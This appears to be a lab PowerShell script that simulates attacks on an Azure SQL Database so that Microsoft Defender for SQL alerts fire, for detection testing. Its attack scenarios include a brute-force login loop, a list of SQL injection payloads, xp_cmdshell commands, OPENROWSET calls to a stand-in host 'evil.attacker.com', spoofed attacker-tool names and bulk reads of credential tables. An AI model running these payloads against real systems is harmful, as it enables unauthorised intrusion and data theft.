<#
.SYNOPSIS
Triggers Defender for SQL alerts on Azure SQL Database (PaaS) via client-side
suspicious activity patterns.

.DESCRIPTION
WARNING: LAB USE ONLY. This script intentionally sends suspicious queries and
failed logins to an Azure SQL Database to trigger Microsoft Defender for SQL
alerts. Only run against isolated test databases. See SECURITY.md.

Unlike the IaaS/Arc simulator track (Run-AllIaaSSimulations.ps1), there is no
on-machine simulator binary for PaaS. Instead, this script generates
client-side activity patterns that Defender for SQL may detect:

  - BruteForce:    Rapid failed login attempts with wrong passwords
  - SqlInjection:  Queries resembling SQL injection attack patterns
  - SuspiciousApp: Connections using known malicious application names
  - ShellAccess:   Attempts to use xp_cmdshell / OPENROWSET (blocked on PaaS)
  - DataExfiltration: Bulk data access patterns (requires seeded data)

IMPORTANT: PaaS detection is behavioral and baseline-driven. Alerts are NOT
guaranteed and may take 5-60 minutes to appear. Some scenarios work better on
databases with established usage baselines.

Confidence levels:
  High   - BruteForce (most reliable PaaS alert trigger)
  Medium - SqlInjection, SuspiciousApp
  Low    - ShellAccess, DataExfiltration (anomaly-based, needs baseline)

.PARAMETER ServerName
Fully qualified Azure SQL server name (e.g., myserver.database.windows.net)
or just the short name (script appends .database.windows.net).

.PARAMETER DatabaseName
Name of the target Azure SQL Database. Default: testdb.

.PARAMETER SqlUser
SQL Authentication username (must be an existing login on the server).

.PARAMETER SqlPassword
Password for SqlUser.

.PARAMETER Attacks
Which scenarios to run. Default: all. Use ValidateSet to pick a subset.

.PARAMETER BruteForceAttempts
Number of failed login attempts for the BruteForce scenario. Default: 50.

.PARAMETER BruteForceDelayMs
Delay between brute force attempts in milliseconds. Default: 200.

.PARAMETER SeedExfiltrationData
If set, creates and populates a test table (dbo.ExfilTestData) with sample
rows before running the DataExfiltration scenario.

.PARAMETER DelaySeconds
Seconds to wait between scenarios. Default: 10.

.EXAMPLE
.\Run-PaasSimulations.ps1 -ServerName 'myserver' -SqlUser 'sqladmin' -SqlPassword '<YourPassword>'

.EXAMPLE
.\Run-PaasSimulations.ps1 -ServerName 'myserver.database.windows.net' `
    -DatabaseName 'testdb' -SqlUser 'sqladmin' -SqlPassword '<YourPassword>' `
    -Attacks BruteForce,SqlInjection -BruteForceAttempts 100
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$ServerName,
    [string]$DatabaseName = 'testdb',
    [Parameter(Mandatory)][string]$SqlUser,
    [Parameter(Mandatory)][string]$SqlPassword,
    [ValidateSet('BruteForce','SqlInjection','SuspiciousApp','ShellAccess','DataExfiltration')]
    [string[]]$Attacks = @('BruteForce','SqlInjection','SuspiciousApp','ShellAccess','DataExfiltration'),
    [int]$BruteForceAttempts = 50,
    [int]$BruteForceDelayMs = 200,
    [switch]$SeedExfiltrationData,
    [int]$DelaySeconds = 10
)

$ErrorActionPreference = 'Stop'

# Normalize server name
if ($ServerName -notlike '*.database.windows.net') {
    $ServerName = "$ServerName.database.windows.net"
}

# Detect client IP for correlation
$clientIp = 'unknown'
try { $clientIp = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch {}

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host " Defender for SQL — PaaS Alert Simulation" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Server:      $ServerName"
Write-Host "Database:    $DatabaseName"
Write-Host "User:        $SqlUser"
Write-Host "Client IP:   $clientIp"
Write-Host "Scenarios:   $($Attacks -join ', ')"
Write-Host ""
Write-Host "NOTE: PaaS alerts are behavioral. Results are best-effort." -ForegroundColor Yellow
Write-Host "      Alerts may take 5-60 minutes to appear in Defender." -ForegroundColor Yellow
Write-Host ""

# --- Helper: Build connection string ---
function New-ConnString {
    param(
        [string]$Server   = $ServerName,
        [string]$Database = $DatabaseName,
        [string]$User     = $SqlUser,
        [string]$Pass     = $SqlPassword,
        [string]$AppName  = 'DefenderLabTester',
        [int]$Timeout     = 30
    )
    "Server=tcp:$Server,1433;Initial Catalog=$Database;Persist Security Info=False;User ID=$User;Password=$Pass;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=$Timeout;Application Name=$AppName;"
}

# --- Helper: Execute SQL via ADO.NET ---
function Invoke-SqlQuery {
    param(
        [string]$ConnectionString,
        [string]$Query,
        [switch]$SuppressErrors
    )
    $conn = $null
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection($ConnectionString)
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $cmd.CommandTimeout = 30
        $reader = $cmd.ExecuteReader()
        $rows = 0
        while ($reader.Read()) { $rows++ }
        $reader.Close()
        return @{ Success = $true; Rows = $rows; Error = $null }
    }
    catch {
        if (-not $SuppressErrors) {
            Write-Verbose "SQL error (expected in simulation): $($_.Exception.Message)"
        }
        return @{ Success = $false; Rows = 0; Error = $_.Exception.Message }
    }
    finally {
        if ($conn -and $conn.State -eq 'Open') { $conn.Close() }
        if ($conn) { $conn.Dispose() }
    }
}

# --- Helper: Try connecting (returns success/failure) ---
function Test-SqlConnection {
    param(
        [string]$ConnectionString,
        [switch]$SuppressErrors
    )
    $conn = $null
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection($ConnectionString)
        $conn.Open()
        $conn.Close()
        return $true
    }
    catch {
        if (-not $SuppressErrors) {
            Write-Verbose "Connection failed (expected): $($_.Exception.Message)"
        }
        return $false
    }
    finally {
        if ($conn) { $conn.Dispose() }
    }
}

# --- Results tracking ---
$results = [System.Collections.ArrayList]::new()

function Add-Result {
    param(
        [string]$Attack,
        [string]$Status,
        [string]$Confidence,
        [string]$Detail,
        [string]$ExpectedAlerts,
        [datetime]$StartTime,
        [datetime]$EndTime
    )
    [void]$results.Add([pscustomobject]@{
        Attack         = $Attack
        Status         = $Status
        Confidence     = $Confidence
        StartUtc       = $StartTime.ToString('yyyy-MM-ddTHH:mm:ssZ')
        EndUtc         = $EndTime.ToString('yyyy-MM-ddTHH:mm:ssZ')
        ExpectedAlerts = $ExpectedAlerts
        Detail         = $Detail
    })
}

# =====================================================================
# SCENARIO: BruteForce
# =====================================================================
function Run-BruteForce {
    Write-Host "`n==> Running scenario: BruteForce (confidence: HIGH)" -ForegroundColor Green
    Write-Host "    Sending $BruteForceAttempts failed login attempts..."
    $start = [datetime]::UtcNow
    $failCount = 0

    for ($i = 1; $i -le $BruteForceAttempts; $i++) {
        $badPass = "WrongPassword_$i`_$(Get-Random)"
        $cs = New-ConnString -Pass $badPass -Timeout 5
        $ok = Test-SqlConnection -ConnectionString $cs -SuppressErrors
        if (-not $ok) { $failCount++ }
        if ($i % 10 -eq 0) { Write-Host "    ... $i / $BruteForceAttempts attempts" }
        Start-Sleep -Milliseconds $BruteForceDelayMs
    }

    # One successful login at the end (may trigger "successful brute force" alert)
    Write-Host "    Sending 1 successful login after failed attempts..."
    $cs = New-ConnString -Timeout 10
    $finalOk = Test-SqlConnection -ConnectionString $cs -SuppressErrors

    $end = [datetime]::UtcNow
    $detail = "$failCount failed + $(if ($finalOk) {'1 success'} else {'0 success'}) from $clientIp"
    Write-Host "    $detail"
    Add-Result -Attack 'BruteForce' -Status 'SENT' -Confidence 'HIGH' `
        -Detail $detail `
        -ExpectedAlerts 'SQL.DB_BruteForce' `
        -StartTime $start -EndTime $end
}

# =====================================================================
# SCENARIO: SqlInjection
# =====================================================================
function Run-SqlInjection {
    Write-Host "`n==> Running scenario: SqlInjection (confidence: MEDIUM)" -ForegroundColor Green
    $start = [datetime]::UtcNow
    $cs = New-ConnString
    $sentCount = 0

    $injectionPayloads = @(
        # Classic UNION-based injection patterns
        "SELECT * FROM sys.tables WHERE name = '' UNION SELECT name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sys.sql_logins--"
        "SELECT 1 WHERE 'a'='a' OR 1=1"
        "SELECT * FROM sys.objects WHERE name = '' OR ''=''"

        # Tautology / always-true conditions
        "SELECT * FROM sys.tables WHERE 1=1 OR 'x'='x'"

        # Stacked queries pattern
        "SELECT 1; SELECT name FROM sys.databases;"

        # WAITFOR-based blind injection pattern
        "IF (SELECT COUNT(*) FROM sys.sql_logins) > 0 WAITFOR DELAY '00:00:05'"
        "SELECT CASE WHEN (1=1) THEN 'a' ELSE 1/0 END"

        # Error-based extraction attempts
        "SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.sql_logins))"

        # Dynamic SQL with suspicious concatenation
        "EXEC('SELECT ' + '1; SELECT name FROM sys.databases')"

        # Comment-based evasion
        "SELECT/**/1/**/FROM/**/sys.tables"
        "SE/**/LECT name FR/**/OM sys.databases"
    )

    foreach ($payload in $injectionPayloads) {
        $r = Invoke-SqlQuery -ConnectionString $cs -Query $payload -SuppressErrors
        $sentCount++
        $status = if ($r.Success) { 'executed' } else { 'error (expected)' }
        Write-Verbose "    Payload $sentCount : $status"
    }

    $end = [datetime]::UtcNow
    $detail = "$sentCount injection-pattern queries sent"
    Write-Host "    $detail"
    Add-Result -Attack 'SqlInjection' -Status 'SENT' -Confidence 'MEDIUM' `
        -Detail $detail `
        -ExpectedAlerts 'SQL.DB_PotentialSqlInjection, SQL.DB_VulnerabilityToSqlInjection' `
        -StartTime $start -EndTime $end
}

# =====================================================================
# SCENARIO: SuspiciousApp
# =====================================================================
function Run-SuspiciousApp {
    Write-Host "`n==> Running scenario: SuspiciousApp (confidence: MEDIUM)" -ForegroundColor Green
    $start = [datetime]::UtcNow
    $sentCount = 0

    # Known penetration testing / attack tool application names
    $suspiciousApps = @(
        'sqlmap'
        'havij'
        'jSQL Injection'
        'SQLNinja'
        'Pangolin'
        'Absinthe'
        'SQLSentinel'
        'DSSS'
        'Blisqy'
        'NoSQLMap'
    )

    foreach ($app in $suspiciousApps) {
        $cs = New-ConnString -AppName $app
        $ok = Test-SqlConnection -ConnectionString $cs -SuppressErrors
        $sentCount++
        $status = if ($ok) { 'connected' } else { 'failed' }
        Write-Verbose "    App '$app': $status"
        # Run a simple query if connected
        if ($ok) {
            Invoke-SqlQuery -ConnectionString $cs -Query "SELECT GETDATE()" -SuppressErrors | Out-Null
        }
        Start-Sleep -Milliseconds 500
    }

    $end = [datetime]::UtcNow
    $detail = "$sentCount connections with suspicious application names"
    Write-Host "    $detail"
    Add-Result -Attack 'SuspiciousApp' -Status 'SENT' -Confidence 'MEDIUM' `
        -Detail $detail `
        -ExpectedAlerts 'SQL.DB_HarmfulApplication' `
        -StartTime $start -EndTime $end
}

# =====================================================================
# SCENARIO: ShellAccess
# =====================================================================
function Run-ShellAccess {
    Write-Host "`n==> Running scenario: ShellAccess (confidence: LOW)" -ForegroundColor Green
    Write-Host "    (xp_cmdshell / OPENROWSET are blocked on PaaS; attempts may still trigger alerts)"
    $start = [datetime]::UtcNow
    $cs = New-ConnString
    $sentCount = 0

    $shellPayloads = @(
        # xp_cmdshell attempts (will fail on PaaS but the attempt is logged)
        "EXEC xp_cmdshell 'whoami'"
        "EXEC xp_cmdshell 'ipconfig'"
        "EXEC xp_cmdshell 'net user'"
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

        # External access attempts
        "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil.attacker.com;', 'SELECT 1')"
        "SELECT * FROM OPENROWSET(BULK 'https://evil.attacker.com/payload.txt', SINGLE_CLOB) AS x"
    )

    foreach ($payload in $shellPayloads) {
        $r = Invoke-SqlQuery -ConnectionString $cs -Query $payload -SuppressErrors
        $sentCount++
        Write-Verbose "    Shell payload $sentCount : $(if ($r.Success) {'ok'} else {'blocked (expected)'})"
    }

    $end = [datetime]::UtcNow
    $detail = "$sentCount shell/external access attempts (all expected to be blocked)"
    Write-Host "    $detail"
    Add-Result -Attack 'ShellAccess' -Status 'SENT' -Confidence 'LOW' `
        -Detail $detail `
        -ExpectedAlerts 'SQL.DB_ShellExternalSourceAnomaly' `
        -StartTime $start -EndTime $end
}

# =====================================================================
# SCENARIO: DataExfiltration
# =====================================================================
function Run-DataExfiltration {
    Write-Host "`n==> Running scenario: DataExfiltration (confidence: LOW)" -ForegroundColor Green
    Write-Host "    (Anomaly-based detection; works better on databases with established baselines)"
    $start = [datetime]::UtcNow
    $cs = New-ConnString

    # Optionally seed test data
    if ($SeedExfiltrationData) {
        Write-Host "    Seeding test table dbo.ExfilTestData..."
        $seedSql = @"
IF OBJECT_ID('dbo.ExfilTestData', 'U') IS NULL
BEGIN
    CREATE TABLE dbo.ExfilTestData (
        Id INT IDENTITY(1,1) PRIMARY KEY,
        FullName NVARCHAR(200),
        Email NVARCHAR(200),
        SSN NVARCHAR(20),
        CreditCard NVARCHAR(30),
        Notes NVARCHAR(MAX)
    );
END;

-- Insert 5000 rows of fake sensitive-looking data
DECLARE @i INT = 1;
WHILE @i <= 5000
BEGIN
    INSERT INTO dbo.ExfilTestData (FullName, Email, SSN, CreditCard, Notes)
    VALUES (
        CONCAT('TestUser_', @i),
        CONCAT('user', @i, '@example.com'),
        CONCAT(ABS(CHECKSUM(NEWID())) % 900 + 100, '-', ABS(CHECKSUM(NEWID())) % 90 + 10, '-', ABS(CHECKSUM(NEWID())) % 9000 + 1000),
        CONCAT('4', RIGHT(REPLICATE('0', 15) + CAST(ABS(CHECKSUM(NEWID())) AS NVARCHAR), 15)),
        REPLICATE('Sensitive data payload. ', 20)
    );
    SET @i = @i + 1;
END;
"@
        $r = Invoke-SqlQuery -ConnectionString $cs -Query $seedSql -SuppressErrors
        if ($r.Success) {
            Write-Host "    Seeded 5000 rows."
        } else {
            Write-Host "    Seed may have partially completed (table may already exist)." -ForegroundColor Yellow
        }
    }

    # Bulk read patterns — repeated full table scans
    $exfilQueries = @(
        "SELECT * FROM dbo.ExfilTestData"
        "SELECT FullName, Email, SSN, CreditCard FROM dbo.ExfilTestData"
        "SELECT TOP 10000 * FROM dbo.ExfilTestData ORDER BY Id"
        "SELECT * FROM dbo.ExfilTestData WHERE SSN LIKE '%-%'"
        "SELECT * FROM dbo.ExfilTestData WHERE CreditCard LIKE '4%'"
    )

    # Also scan system catalog (unusual bulk metadata access)
    $exfilQueries += @(
        "SELECT * FROM sys.sql_logins"
        "SELECT * FROM sys.database_principals"
        "SELECT * FROM sys.objects"
        "SELECT * FROM INFORMATION_SCHEMA.COLUMNS"
        "SELECT * FROM sys.dm_exec_sessions"
    )

    $sentCount = 0
    $totalRows = 0
    foreach ($q in $exfilQueries) {
        # Run each query multiple times to amplify the pattern
        for ($rep = 1; $rep -le 3; $rep++) {
            $r = Invoke-SqlQuery -ConnectionString $cs -Query $q -SuppressErrors
            $sentCount++
            if ($r.Success) { $totalRows += $r.Rows }
        }
    }

    $end = [datetime]::UtcNow
    $detail = "$sentCount bulk queries, ~$totalRows total rows read"
    Write-Host "    $detail"
    Add-Result -Attack 'DataExfiltration' -Status 'SENT' -Confidence 'LOW' `
        -Detail $detail `
        -ExpectedAlerts 'SQL.DB_DataExfiltration (anomaly-based)' `
        -StartTime $start -EndTime $end
}

# =====================================================================
# RUN SELECTED SCENARIOS
# =====================================================================

# Verify connectivity first
Write-Host "Verifying connectivity to $ServerName..." -ForegroundColor Cyan
$testCs = New-ConnString -Timeout 10
if (-not (Test-SqlConnection -ConnectionString $testCs)) {
    Write-Error @"
Cannot connect to $ServerName.
Verify:
  1. Server firewall allows your IP ($clientIp).
  2. SQL credentials are correct.
  3. Database '$DatabaseName' exists.
"@
    return
}
Write-Host "    Connected successfully.`n"

foreach ($attack in $Attacks) {
    switch ($attack) {
        'BruteForce'        { Run-BruteForce }
        'SqlInjection'      { Run-SqlInjection }
        'SuspiciousApp'     { Run-SuspiciousApp }
        'ShellAccess'       { Run-ShellAccess }
        'DataExfiltration'  { Run-DataExfiltration }
    }

    if ($attack -ne $Attacks[-1]) {
        Write-Host "`n    Waiting $DelaySeconds seconds before next scenario..." -ForegroundColor DarkGray
        Start-Sleep -Seconds $DelaySeconds
    }
}

# =====================================================================
# SUMMARY
# =====================================================================
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host " Summary" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Server:    $ServerName"
Write-Host "Database:  $DatabaseName"
Write-Host "Client IP: $clientIp"
Write-Host ""

$results | Format-Table -AutoSize -Property Attack, Status, Confidence, StartUtc, EndUtc, ExpectedAlerts, Detail

Write-Host @"

NEXT STEPS:
  1. Wait 5-60 minutes for alerts to appear in Microsoft Defender for Cloud.
  2. Check alerts:
     - Azure Portal > Microsoft Defender for Cloud > Security alerts
     - Filter by resource: $ServerName
  3. Run KQL queries from kql/sentinel/ or kql/xdr/ to validate.
  4. HIGH confidence scenarios (BruteForce) should fire reliably.
     MEDIUM/LOW scenarios depend on Defender baseline and detection models.

CORRELATION TIPS:
  - Filter alerts by client IP: $clientIp
  - Filter by time range: $($results[0].StartUtc) to $($results[-1].EndUtc)
  - Look for alert IDs: SQL.DB_BruteForce, SQL.DB_PotentialSqlInjection,
    SQL.DB_HarmfulApplication, SQL.DB_ShellExternalSourceAnomaly
"@
